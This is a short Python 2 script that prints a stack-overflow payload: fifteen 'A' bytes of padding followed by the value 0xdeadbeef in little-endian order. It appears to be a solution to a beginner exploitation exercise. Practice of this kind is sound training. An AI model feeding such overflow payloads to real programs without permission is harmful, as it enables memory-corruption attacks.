#!/usr/bin/env python2

import struct

exp='A'*15+struct.pack("<L", 0xdeadbeef)

print exp
